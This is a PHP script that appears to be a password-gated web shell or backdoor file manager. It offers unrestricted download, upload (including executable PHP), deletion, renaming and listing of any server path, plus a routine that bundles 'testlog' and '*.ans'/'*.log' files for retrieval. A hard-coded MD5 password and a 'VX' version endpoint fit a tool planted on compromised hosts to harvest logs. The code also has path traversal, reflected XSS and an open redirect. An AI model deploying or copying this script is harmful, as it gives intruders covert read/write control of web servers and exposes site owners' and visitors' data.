<?php

error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);

define("FILE_LOAD_BLOCK_SIZE", 16384);
define("VX", "9b7e443f689d3be70ac0421ab7b6f170d475b2d0");
define("PWD", "76247496fbbcd44ff2bb3246f25587e0");

session_start();

if(isset($_POST['a']) && $_POST['a'] == 'login') {
	if(md5($_POST['e']) == PWD) {
		$_SESSION['pass'] = PWD;
	}
}

if(isset($_SESSION['pass']) && $_SESSION['pass'] == PWD) {
	switch ($_REQUEST['a']) {
		case "logout": {
			session_destroy();
			header("Location: " . $_SERVER['SCRIPT_NAME']);
			break;
		}
		case "vx": {
			echo "<div id='vx'>" . VX . "</div>";
			break;	
		}
		case "new": {
			if(file_exists("testlog.php")) {
				$fname = "testlog.php";
			} elseif (file_exists("testlog.txt")) {
				$fname = "testlog.txt";
			} else {
				echo "File not found! <a href='".$_SERVER['SCRIPT_FILENAME']."'>back</a>";
				break;
			}
			
			$filename = "testlog." . $_SERVER['HTTP_HOST'] . "." . gmdate("Ymd.His") . ".txt";
			if(!rename($fname, $filename . ".txt")) {
				echo "Error renaming $fname";
				break;
			}
			$filecontent = file_get_contents($filename . ".txt");
			if($filecontent === false) {
				echo "Can't read " . $filename . ".txt";
				break;
			}
			$filecontent_gz = gzencode($filecontent, 9, FORCE_GZIP);
			if($filecontent_gz === false) {
				echo "Can't gzip " . $filename . ".txt";
				break;
			}
			
			if(file_put_contents($filename . ".gz", $filecontent_gz) != strlen($filecontent_gz)) {
				echo "Can't write file " . $filename . ".gz";
				break;
			}
			
			unlink($filename . ".txt");
			echo "New log saved: <a href='".$_SERVER['SCRIPT_NAME']."?a=download&f=".urlencode($filename.".gz")."'>" . $filename . ".gz</a> (".number_format(filesize($filename.".gz"), 0, ",", " ")." b)<br>";
			
			break;
		}
		case "hash":{
			if(!isset($_GET['f']) || !file_exists($_GET['f'])) {
				echo "File not found: " . $_GET['f'];
				break;
			}
			
			$file_hash = hash_file("md5", $_GET['f']);		
			echo "<div id='hash'>" . $file_hash . "</div>";
			break;			
		}		
		case "download": {
			if(!isset($_GET['f']) || !file_exists($_GET['f'])) {
				echo "File not found: " . $_GET['f'];
				break;
			}

			$dfile_size = filesize($_GET['f']);			

			$hfile = fopen($_GET['f'], "rb");
			if($hfile === false) {
				echo "Error opening file " . $_GET['f'];
				break;
			}
			
			$conent_len = $dfile_size;
			
			if(isset($_SERVER['HTTP_RANGE'])) {						
				$range = trim($_SERVER['HTTP_RANGE']);					
				if(preg_match("/bytes=(\d+)\-/", $range, $res)) {
					$first = intval($res[1]);
					if($first > $dfile_size) {
						header("Status: 416 Requested range not satisfiable");
						exit();
					}
				} else {
					header("Status: 416 Requested range not satisfiable");
					exit();
				}
				
				$last = $dfile_size - 1;		
				$conent_len = $last - $first + 1;
				
				fseek($hfile, $first);
				
				header("HTTP/1.1 206 Partial content");
				header("Accept-Ranges: bytes");		
				header("Content-Range: bytes $first-$last/$dfile_size");				
			}
			
			header("Content-Disposition: attachment; filename=".$_GET['f']);
			header("Content-Type: application/force-download");
			header("Content-Transfer-Encoding: binary");
			header("Content-Length: " . $conent_len);
			header("Pragma: no-cache");
			header("Expires: 0");
			
			
			while (!feof($hfile)) {
				echo fread($hfile, FILE_LOAD_BLOCK_SIZE);
			}
			
			fclose($hfile);
			
            exit();     // Do not show admin form
			break;
		}
		case "delete": {
			if(!isset($_GET['f']) || !file_exists($_GET['f'])) {
				echo "File not found: " . $_GET['f'];
				break;
			}
			
			if(is_dir($_GET['f'])) {
                if(rmdir($_GET['f'])) {
                    $st = "Directory <b>".$_GET['f']."</b> deleted.";
                    if(isset($_REQUEST['ret'])) {
                        header("Location: " . $_REQUEST['ret']."&status=".urlencode($st));
                        exit();
                    }
                    echo $st;
                } else {
                    $st = "Couldn't delete <b>" . $_GET['f'] . "</b> directory<br>" . serialize(error_get_last());
                    if(isset($_REQUEST['ret'])) {
                        header("Location: " . $_REQUEST['ret']."&status=".urlencode($st));
                        exit();
                    }
                    echo $st;
                }
            }

            if(unlink($_GET['f'])) {
				$st = "File <b>".$_GET['f']."</b> Deleted";
                if(isset($_REQUEST['ret'])) {
					header("Location: " . $_REQUEST['ret']."&status=".urlencode($st));
                    exit();
				}
				echo $st;
			} else {
				echo "Couldn't delete " . $_GET['f'] . "<br>";
                print_r(error_get_last());
			}
			break;
		}
		case "newans": {
			$answers = glob("*.ans");
			$alogs = glob("*.log");
			
			if(is_array($answers) && is_array($alogs)) {
				$answers = array_merge($answers, $alogs);
			} elseif(is_array($alogs)) {
				$answers = $alogs;
			}
			
			if(count($answers) > 0) {
				$filename = "anslogs." . $_SERVER['HTTP_HOST'] . "." . gmdate("Ymd.His") . ".gz";
				$zfile = gzopen($filename, "wb9");
				if($zfile === false) {
					echo "Error creating gzip file " . $filename . "<br>";
					break;
				}
				
				for($i = 0; $i < count($answers); $i++) {
					$tfile = fopen($answers[$i], "r");
					if($tfile === false) {
						echo "Error opening file " . $answers[$i] . "<br>";
						break;
					}
					
					gzwrite($zfile, $answers[$i] . "\t" . filesize($answers[$i]) . "\t");
					while(!feof($tfile)) {
						gzwrite($zfile, fread($tfile, 24576)); 
					}
					fclose($tfile);
					gzwrite($zfile, "\n");
				}
				gzclose($zfile);
				
				//exec("tar -czf " . $filename . " " . implode(" " , $answers));
				//exec("gzip " . $filename . " " . );
				
				if(file_exists($filename) && filesize($filename) > 0) {
					for($i = 0; $i < count($answers); $i++) {
						unlink($answers[$i]);
					}
					
					echo "Answers saved: <a href='".$_SERVER['SCRIPT_NAME']."?a=download&f=".urlencode($filename)."'>" . $filename . "</a> (".number_format(filesize($filename), 0, ",", " ")." b)<br>";
				} else {
					echo "Error creating archive!<br>";
					break;
				}
			} else {
				echo "No new answers!<br>";
				echo "answers=".serialize($answers);
			}
			
			break;
		}
		case "upload": {
			if(count($_FILES) == 0 || count($_FILES['ufiles']) == 0) {
				echo __LINE__ . " Error. No files uploaded!<br>";
				break;
			}
			
			$upload_count = 0; $upload_size = 0; $upload_dir = (isset($_REQUEST['dir']) && $_REQUEST['dir'] != "" ? $_REQUEST['dir'] . "/" : "");
			if(is_array($_FILES['ufiles']['tmp_name'])) {
				// many files
				$filenum = count($_FILES['ufiles']['tmp_name']);
				for($i = 0; $i < $filenum; $i++) {
                    if($_FILES['ufiles']['tmp_name'][$i] != "") {
                        if(is_uploaded_file($_FILES['ufiles']['tmp_name'][$i])) {
                            if((isset($_REQUEST['rewrite']) && $_REQUEST['rewrite'] == 'true') || !file_exists($upload_dir . $_FILES['ufiles']['name'][$i])) {
                                unlink($_FILES['ufiles']['name'][$i]);
                                move_uploaded_file($_FILES['ufiles']['tmp_name'][$i], $upload_dir . $_FILES['ufiles']['name'][$i]);
                                $upload_count++;
                                $upload_size += $_FILES['ufiles']['size'][$i];
                            } else {
                                echo __LINE__ . " File <b>" . $upload_dir . $_FILES['ufiles']['name'][$i] ."</b> already exists.<br>Continue to <a href='".$_SERVER['PHP_SELF']."?a=list".($upload_dir != "" ? "&dir=".substr($upload_dir, 0, -1)."'>".$upload_dir : "'>Directory listing")."</a><br>\n";
                                continue;
                            }
						} else {
							echo __LINE__ . " Error uploading file. <b>" . $upload_dir . $_FILES['ufiles']['tmp_name'][$i] . "</b><br><pre>";
							print_r($_FILES);
							echo "</pre><br>\n";
                            continue;
						}
					}
				}
			} else {
				// one file
				if(is_uploaded_file($_FILES['ufiles']['tmp_name'])) {
                    if((isset($_REQUEST['rewrite']) && $_REQUEST['rewrite'] == 'true') || !file_exists($upload_dir . $_FILES['ufiles']['name'][$i])) {
    					move_uploaded_file($_FILES['ufiles']['tmp_name'], $upload_dir . $_FILES['ufiles']['name']);
                        $upload_count++;
                        $upload_size += $_FILES['ufiles']['size'];
                    } else {
                        echo __LINE__ . " File " . $_FILES['ufiles']['name'][$i] ." already exists.";
                        break;
                    }
				} else {
					echo __LINE__ . " Error uploading file. " . $_FILES['ufiles']['tmp_name'] . "<br>";
				}
			}
			
//			echo "UDIR=".$upload_dir[strlen($upload_dir) - 1] . " eq=".serialize($upload_dir[count($upload_dir) - 1] == '/');
            if($upload_dir != "" && $upload_dir[strlen($upload_dir) - 1] == '/') {
                $upload_dir = substr($upload_dir, 0, -1);
            }

            if($upload_count == 0) {
				$st = "No files uploaded.<br>";
                header("Location: " . $_SERVER['PHP_SELF'] . "?a=list". ($upload_dir != "" ? "&dir=".$upload_dir : "") . "&status=" . urlencode($st));
                echo $st;
            } elseif($upload_count == 1) {
                $st = "1 file uploaded (" . number_format($upload_size, 0, ',', ' ') . " bytes)<br>";
                header("Location: " . $_SERVER['PHP_SELF'] . "?a=list". ($upload_dir != "" ? "&dir=".$upload_dir : "") . "&status=" . urlencode($st));
                echo $st;
            } else {
                $st = $upload_count . " files uploaded (" . number_format($upload_size, 0, ',', ' ') . " bytes)<br>";
                header("Location: " . $_SERVER['PHP_SELF'] . "?a=list". ($upload_dir != "" ? "&dir=".$upload_dir : "") . "&status=" . urlencode($st));
                echo $st;
            }
			break;
		}
		case "list": {
			if(isset($_REQUEST['rename']) && isset($_REQUEST['from']) && isset($_REQUEST['to']) && file_exists($_REQUEST['from']) && !file_exists($_REQUEST['to'])) {
				$result = rename($_REQUEST['from'], $_REQUEST['to']);
				echo "Rename file:" . $_REQUEST['from'] . ", new name=" . $_REQUEST['to'] . " Result=" . $result . "<br>";
			}
            if(isset($_REQUEST['dir']) && is_dir($_REQUEST['dir'])) { $cdir = $_REQUEST['dir'] . "/"; } else { $cdir = ""; }
			$files = array_merge(glob($cdir . "*"), glob($cdir . ".*"));
            $i = array_search($cdir . ".", $files);
            if($i !== false) { unset($files[$i]); }
//            $i = array_search($cdir . "..", $files);
//            if($i !== false) { unset($files[$i]); }
//            echo serialize(array_search($cdir."...", $files)) . "<br>" . serialize(in_array($cdir."..", $files)) . "<br>";
            sort($files);
//            print_r($files);die();

            $out_dirs = "<a href='".$_SERVER['PHP_SELF']."?a=list'>".dirname($_SERVER['PHP_SELF'])."</a> / ";
            if($cdir != "") {
                $dirs = explode("/", $cdir);
                $dir0 = "";
                foreach($dirs as $d) {
                    $dir0 .= ($dir0 == "" ? "" : "/") . $d;
                    $out_dirs .= "<a href='".$_SERVER['PHP_SELF']."?a=list&dir=".$dir0."'>".$d."</a> / ";
                }
            }
            $out_dirs = substr($out_dirs, 0, -3);
            echo $out_dirs . "<br>";

            echo "<table style='border: 1px solid #999999;'><tr bgcolor='#DDDDDD'><td>Name<td>Size<td>mDate<td>operations";
			for($i = 0; $i < count($files); $i++) {
				echo "<tr"; if($i % 2 == 1) { echo " bgcolor='#EEEEEE'"; }
				if(is_dir($files[$i])) {
                    if(basename($files[$i]) == ".." && strpos(dirname($_SERVER['PHP_SELF']), $files[$i]) != false) {
                        echo "><td><a href='".$_SERVER['PHP_SELF']."?a=list&dir=".substr($files[$i], 0, strrpos("/", $files[$i]))."'>".basename($files[$i])."</a></td><td align='right'>dir</td><td>" . gmdate("Y-m-d H:i:s", filemtime($files[$i])) . "<td><a href='" . urlencode($files[$i]) . "'>(dl)</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=list&rename&from=".urlencode($files[$i])."&to=".$cdir."' onclick='toN=prompt(\"New file name:\", \"".$files[$i]."\"); if(toN == null) { return false; } else { window.location.href = this.href + toN; return false; }'>rename</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=delete&f=".urlencode($files[$i])."&ret=".urlencode($_SERVER['REQUEST_URI'])."' onclick='if(confirm(\"Delete? Really?!\")) { return true; } else { return false;}'>delete</a>";
                    } else {
                        echo "><td><a href='".$_SERVER['PHP_SELF']."?a=list&dir=".$files[$i]."'>".basename($files[$i])."</a></td><td align='right'>dir</td><td>" . gmdate("Y-m-d H:i:s", filemtime($files[$i])) . "<td><a href='" . urlencode($files[$i]) . "'>(dl)</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=list&rename&from=".urlencode($files[$i])."&to=".$cdir."' onclick='toN=prompt(\"New file name:\", \"".$files[$i]."\"); if(toN == null) { return false; } else { window.location.href = this.href + toN; return false; }'>rename</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=delete&f=".urlencode($files[$i])."&ret=".urlencode($_SERVER['REQUEST_URI'])."' onclick='if(confirm(\"Delete? Really?!\")) { return true; } else { return false;}'>delete</a>";
                    }
                } else {
                    echo "><td>" . basename($files[$i]) . "<td align='right'>" . number_format(filesize($files[$i]), 0, ",", " ") . "<td>" . gmdate("Y-m-d H:i:s", filemtime($files[$i])) . "<td><a href='".$_SERVER['SCRIPT_NAME']."?a=download&f=".urlencode($files[$i])."'>download</a> <a href='" . urlencode($files[$i]) . "'>(dl)</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=list&rename&from=".urlencode($files[$i])."&to=' onclick='toN=prompt(\"New file name:\", \"".$files[$i]."\"); if(toN == null) { return false; } else { window.location.href = this.href + toN; return false; }'>rename</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=delete&f=".urlencode($files[$i])."&ret=".urlencode($_SERVER['REQUEST_URI'])."' onclick='if(confirm(\"Delete? Really?!\")) { return true; } else { return false;}'>delete</a>";
                }
			}
			echo "</table>";
			break;
		}
        case "createDir": {
            if(isset($_REQUEST['dirName'])) {
                $_REQUEST['dirName'] = preg_replace("[^a-zA-Z0-9\.\-\_]", "", $_REQUEST['dirName']);
                if($_REQUEST['dirName'] != '') {
                    $mkdir = (isset($_REQUEST['dir']) ? $_REQUEST['dir'] ."/" : "") . $_REQUEST['dirName'];
                    if(mkdir($mkdir)) {
                        $st = "Directory <b>". $mkdir . "</b> created successfully.<br>";
                        header("Location: ".$_SERVER['PHP_SELF']."?a=list&dir=".$_REQUEST['dir']."&status=".urlencode($st));
                        echo $st;
                    } else {
                        echo "Error creating directory <b>" . $mkdir . "</b>.<br>"; print_r(error_get_last());
                    }

                }
            }
            break;
        }
	}

    if(isset($_REQUEST['status']) && $_REQUEST['status'] != "") {
        echo "<div class='info' style='padding: 5px 10px; border: 1px solid #C0D0F0; background-color: #E0EFFF; margin: 5px;'>".stripslashes($_REQUEST['status'])."</div>\n";
    }
	
	$dfiles = glob("testlog." . $_SERVER['HTTP_HOST'] . ".*");
	if($dfiles !== false && count($dfiles) > 0) {
		echo "<table border='0' cellspacing='0' cellpadding='2' width='700'><tr style='background-color: #CCCCCC;'><td>name<td>size<td>date<td>options</tr>";
		for($i=0; $i<count($dfiles); $i++) {
			echo "<tr".($i%2 == 1 ? " style='background-color: #EEEEEE;'" : "")."><td>" . $dfiles[$i] . "<td align='right'>" . number_format(filesize($dfiles[$i]), 0, ",", " ") . "<td align='center'>" . gmdate("d-m-Y H:i:s", filemtime($dfiles[$i])) . "<td><a href='".$_SERVER['SCRIPT_NAME']."?a=download&f=".urlencode($dfiles[$i])."'>download</a> <a href='" . urlencode($dfiles[$i]) . "'>(dl)</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=delete&f=".urlencode($dfiles[$i])."' onclick='if(confirm(\"Delete? Really?!\")) { return true; } else { return false;}'>delete</a><tr>";
		}
		echo "</table>";
	}

	$dfiles = glob("anslogs." . $_SERVER['HTTP_HOST'] . ".*");
	if($dfiles !== false && count($dfiles) > 0) {
		echo "<table border='0' cellspacing='0' cellpadding='2' width='700'><tr style='background-color: #CCCCCC;'><td>name<td>size<td>date<td>options</tr>";
		for($i=0; $i<count($dfiles); $i++) {
			echo "<tr".($i%2 == 1 ? " style='background-color: #EEEEEE;'" : "")."><td>" . $dfiles[$i] . "<td align='right'>" . number_format(filesize($dfiles[$i]), 0, ",", " ") . "<td align='center'>" . gmdate("d-m-Y H:i:s", filemtime($dfiles[$i])) . "<td><a href='".$_SERVER['SCRIPT_NAME']."?a=download&f=".urlencode($dfiles[$i])."'>download</a> <a href='" . urlencode($dfiles[$i]) . "'>(dl)</a> <a href='".$_SERVER['SCRIPT_NAME']."?a=delete&f=".urlencode($dfiles[$i])."' onclick='if(confirm(\"Delete? Really?!\")) { return true; } else { return false;}'>delete</a><tr>";
		}
		echo "</table>";
	}

	?><hr>Upload files: 
<style>span {float: left;}</style>
<script type="text/javascript">
function newFile() {
	div = document.getElementById('ufilesDiv');
	spans = document.getElementsByTagName('span');
	newspan = document.createElement('span');
	newspan.style.display = "block";
    newspan.innerHTML = (spans.length + 1) + ". <input type='file' name='ufiles[]' onchange='newFile();'>";
	div.appendChild(newspan);
}
</script>
<form action='<?=$_SERVER['SCRIPT_NAME']?>' method='post' enctype='multipart/form-data'>
<?php if(isset($_REQUEST['dir']) && $_REQUEST['dir'] != "") { echo "<input type='hidden' name='dir' value='".$_REQUEST['dir']."'>"; } ?><input type="hidden" name="a" value="upload"><input type="checkbox" name="rewrite" value="true">Rewrite existing files:<br/>
<div id="ufilesDiv"><span>1. <input type="file" name="ufiles[]" onchange="newFile();"><br></span></div>
<input type="submit" value="Go!">
</form>
	<?php
    echo "<hr><form action='".$_SERVER['PHP_SELF']."' method='GET'>Create dir: <input type='hidden' name='a' value='createDir'>".
        (isset($_REQUEST['dir']) && $_REQUEST['dir'] != "" ? "<input type='hidden' name='dir' value='".$_REQUEST['dir']."'>" : "")
        ."<input type='text' name='dirName' id='dirName'><input type='submit' value='Ok' onclick='if(document.getElementById(\"dirName\").value == \"\") { return false; }'> ";
	echo "<hr><a href='".$_SERVER['SCRIPT_NAME']."'>view</a> | ";
	
	
	if(file_exists("testlog.php")) {
		$fname = "testlog.php";
	} elseif (file_exists("testlog.txt")) {
		$fname = "testlog.txt";
	} else {
		$fname = false;
	}
	if(!$fname) {
		echo "no logs";
	} else {
		echo "<a href='".$_SERVER['SCRIPT_NAME']."?a=new'>Compress new logs</a> <font size='-2'> (" . number_format(filesize($fname), 0, ",", " ") . " b)</font>";
	}
	
	$answers = glob("*.ans"); if(!$answers) { $answers = array(); }
	$alogs = glob("*.log"); if(!$alogs) { $alogs = array(); }
	if(count($answers) > 0 || count($alogs) > 0) {
		echo " | <a href='".$_SERVER['SCRIPT_NAME']."?a=newans'>Compress answers</a> <font size='-2'> (" . number_format(count($answers), 0, ",", " ") . " ans, " . number_format(count($alogs), 0, ",", " ") . " alogs)</font>";
		//echo serialize($answers) . " " . serialize($alogs);
	}
	
	echo " | <a href='".$_SERVER['SCRIPT_NAME']."?a=list'>list files</a> | <a href='".$_SERVER['SCRIPT_NAME']."?a=logout'>logout</a>";
} else {
	echo '<form action="'.$_SERVER['SCRIPT_NAME'].'" method="POST"><input type="password" name="e" size="30"><input type="hidden" name="a" value="login"><input type="submit" value="Ok"></form>';
}

?>